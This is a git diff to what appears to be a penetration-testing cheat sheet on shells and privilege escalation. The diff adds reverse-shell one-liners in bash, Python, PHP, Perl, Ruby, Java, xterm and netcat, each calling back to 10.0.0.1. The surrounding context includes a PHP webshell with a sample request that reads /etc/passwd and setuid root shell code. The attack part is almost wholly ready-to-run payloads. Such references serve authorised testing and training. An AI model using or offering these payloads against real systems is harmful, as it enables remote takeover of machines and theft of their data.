@@ -7,6 +7,9 @@ https://github.com/tennc/webshell
 ```
 git clone https://github.com/tennc/webshell.git
 ```
+## More Reverse Shells
+http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
 
 # Search for Commands that run as Root:
 ## list all programs this account has sudo access to
@@ -96,10 +99,11 @@ ssh user@IP -t "bash --noprofile"
 ssh user@IP -t "/bin/sh"
 ```
 
-## Reverse Shell:
+## Bash Reverse Shell:
 
 ```
 bash -i >& /dev/tcp/<ip-address>/<port> 0>&1
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
 ```
 
 # Programming Language:
@@ -115,6 +119,10 @@ import os; os.system("/bin/bash")
 ```
 ```
 python -c 'import pty; pty.spawn("/bin/bash")'
+```
+## Python Reverse Shell:
+```
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
 ## PHP:
@@ -134,7 +142,7 @@ usage examples
 url/webshell.php?cmd=ls
 ```
 
-## PHP Webshell
+## PHP Webshell:
 https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files
 ```
 <?php
@@ -153,6 +161,10 @@ Once the shell is uploaded (with a random name), you can execute operating syste
 https://example.org/7sna8uuorvcx3x4fx.php?cmd=cat+/etc/passwd
 ```
 
+## PHP Reverse Shell:
+```
+php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
 ## Perl:
 ```
 exec "/bin/sh";
@@ -165,6 +177,10 @@ exec "/bin/bash";
 ```
 ```
 perl —e 'exec "/bin/bash";'
+```
+## Perl Reverse Shell:
+```
+perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```
 
 ## Ruby:
@@ -179,6 +195,10 @@ exec "/bin/bash"
 ```
 ```
 ruby -e 'exec "/bin/bash"'
+```
+## Ruby Reverse Shell:
+```
+ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 ```
 
 ## IRB:
@@ -212,6 +232,30 @@ int main(void){
        setresuid(0, 0, 0);
        system("/bin/sh");
 }       
+```
+## Java Reverse Shell:
+```
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+```
+## Xterm Reverse Shell:
+One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you (10.0.0.1) on TCP port 6001.
+```
+xterm -display 10.0.0.1:1
+```
+To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):
+```
+Xnest :1
+```
+You’ll need to authorise the target to connect to you (command also run on your host):
+```
+xhost +targetip
+```
+
+## Netcat Reverse Shell:
+```
+nc -e /bin/sh 10.0.0.1 1234
 ```
 
 ### Building the SUID Shell binary
